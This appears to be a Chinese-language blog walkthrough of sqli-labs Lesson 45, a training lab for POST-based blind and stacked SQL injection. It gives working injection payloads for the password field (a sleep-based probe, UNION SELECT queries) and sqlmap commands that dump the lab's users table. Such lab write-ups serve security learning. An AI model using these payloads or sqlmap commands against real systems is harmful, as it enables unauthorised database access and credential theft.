---
title: sqli-labs lession-45 POST基于错误-字符型-堆叠盲注
date: 2018-10-30 11:59:48
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-45 POST基于错误-字符型-堆叠盲注

---

## 登录界面

![001](/img/sql/Lesson-45/001.png)

## 分析

源代码与Lesson-44只有闭合方式不同。

## 注入

### 判断类型

同样还是在password注入。依旧是盲注。

`') or 1=1 and if(1,sleep(5),null)#`

通过时间函数函数来判断闭合为`')'`

### 判断字段数

`') or 1=2 union select 1,2,3#`

![002](/img/sql/Lesson-45/002.png)

![003](/img/sql/Lesson-45/003.png)

### 判断当前数据库

`') or 1=2 union select 1,database(),3#`

![004](/img/sql/Lesson-45/004.png)

![005](/source/img/sql/Lesson-45/005.png)

接下来的爆数据库的流程都一样,具体可以看Lesson-44.

{% post_link sqli-labs-lession-44-POST基于错误-字符型-堆叠盲注 点击查看Lesson-44 %}

## 堆叠注入

{% post_link sqli-labs-lession-42-POST报错注入-字符型-堆叠注入 点击查看Lesson-42%}

## SQLMAP

`sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 --flush-session --fresh-queries -v 3`

![006](/img/sql/Lesson-45/006.png)

盲注时间太长了,直接上结果。

`sqlmap -r post/post_45.txt -p login_password --dbms mysql --technique B --method POST --level 3 --risk 3 -D security -T users --columns --dump`

![007](/img/sql/Lesson-45/007.png)

![008](/img/sql/Lesson-45/008.png)




